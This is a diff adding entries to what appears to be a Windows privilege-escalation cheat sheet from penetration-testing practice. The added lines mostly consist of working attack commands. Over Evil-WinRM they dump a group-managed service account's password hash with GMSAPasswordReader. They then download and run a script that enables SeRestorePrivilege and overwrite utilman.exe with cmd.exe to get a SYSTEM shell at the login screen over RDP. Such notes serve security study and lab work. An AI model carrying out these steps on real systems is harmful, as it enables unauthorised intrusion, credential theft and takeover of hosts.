@@ -35,6 +35,10 @@ whoami /priv
 #Rebooting the machine
 shutdown /r /t 0
 
+#To retrieve service accounts hash, we'll use a publicly available tool GMSAPasswordReader
+*Evil-WinRM* PS C:\Users\enox\Desktop> upload GMSAPasswordReader.exe
+*Evil-WinRM* PS C:\Users\enox\Desktop> ./GMSAPasswordReader.exe --accountname svc_apache
+
 #Listing all installed drivers
 driverquery /v
 
@@ -97,6 +101,16 @@ windows-privesc-check2.exe --dump -G
 #Tools
 #Checking the application manifest of fodhelper.exe using sigcheck.exe
 SysinternalsSuite --> sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe
+
+#Specific exploits:
+#whoami /priv
+#SeRestorePrivilege            Restore files and directories  Enabled
+wget https://raw.githubusercontent.com/gtworek/PSBits/master/Misc/EnableSeRestorePrivilege.ps1
+*Evil-WinRM* PS C:\Users\svc_apache$\Documents> upload EnableSeRestorePrivilege.ps1
+*Evil-WinRM* PS C:\Users\svc_apache$\Documents> ./EnableSeRestorePrivilege.ps1
+move C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old
+move C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
+$ rdesktop 192.168.120.91--> WIN+U
 
 
 #Tools
